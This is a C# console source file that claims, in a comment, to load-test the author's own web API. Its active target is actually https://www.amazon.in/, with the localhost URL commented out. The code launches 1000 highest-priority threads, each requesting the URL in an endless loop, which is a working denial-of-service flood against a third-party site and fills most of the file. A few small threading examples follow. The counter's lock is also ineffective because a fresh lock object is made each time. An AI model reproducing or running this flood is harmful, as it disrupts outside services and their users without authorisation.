using System.Diagnostics;

namespace ConsoleTest.Programs;

// DOS Attack On My Own WebApi
public static class Threads
{
      static Stopwatch st = new Stopwatch();
      public static void APIThreader()
      {
            st.Start();
            string url = "https://www.amazon.in/";
            // "http://localhost:5049/";

            // Dictionary<int, string> dt = new Dictionary<int, string>();
            // dt.Add(1, $"{url}LinqJoin/Get_Employees_Joins_Department_Joins_Locations_GroupBy_Department_Name");
            // dt.Add(2, $"{url}LinqJoin/Get_Employees_Join_JobGrades");
            // dt.Add(3, $"{url}LinqJoin/Get_Employees_From_40_80");
            // dt.Add(4, $"{url}LinqJoin/Get_Employees_With_Manager_Name");
            // dt.Add(5, $"{url}LinqJoin/Get_Employees_Joined_Salary_Diff_From MaxSalary");
            // dt.Add(6, $"{url}LinqJoin/Get_Departments_By_Countries");
            // dt.Add(7, $"{url}SubQueriesLinq/Get_Employees_Salary_GT_ID_163");
            // dt.Add(8, $"{url}LinqJoin/Get_Department_Salary_Average");
            // dt.Add(9, $"{url}Firex/Get_Employees_By_Same_Contains_SND");
            // dt.Add(10, $"{url}Firex/Get_Count_Of_Cities");

            List<Thread> lt = new List<Thread>();
            for (int i = 0; i < 1000; i++)
            {
                  // req re = new req(dt[new Random().Next(1, 10)]);
                  req re = new req(url);
                  lt.Add(new Thread(re.WebReq) { Name = $"t{i}" , Priority = ThreadPriority.Highest});
            }

            foreach (var v in lt)
                  v.Start();

            foreach (var x in lt)
                  x.Join();


            // ThreadHelper
            // ThreadHelper th = new ThreadHelper(5, (x) => Console.WriteLine(x));
            // Thread ThreadRun = new Thread(th.Calci);
            // ThreadRun.Start();
            // ThreadRun.Join();
            
            // ==> To use the Threads from thread pooling...
            // ThreadPool.QueueUserWorkItem(new WaitCallback(MyMethod));

            st.Stop();
            Console.Write(st.Elapsed);
      }

}

public class req
{
      private string _url;
      public req(string url)
      {
            _url = url;
      }
      private static int count = 0;
      public void WebReq()
      {
            try
            {
                  HttpClient httpClient = new HttpClient();
                  while (true)
                  {
                        var result = httpClient.GetAsync(_url).Result;
                        Thread t = Thread.CurrentThread;
                        Console.WriteLine($"{(int)result.StatusCode} {count} {t.Name}");

                        object lck = new object();
                        lock (lck) { count++; }
                  }
            }
            catch (Exception e)
            {
                  Console.WriteLine($"Error Occured ! {e.Message}");
            }
      }
}

/// <summary>
/// How to Return a value from a Thread Execution
/// </summary>
public class ThreadHelper
{
      private int _number, sum = 0;
      private Action<int> dele;
      public ThreadHelper(int number, Action<int> del)
      {
            _number = number;
            dele = del;
      }
      public void Calci()
      {
            for (int i = 0; i < _number; i++)
                  sum += i;
            dele(sum);
      }
}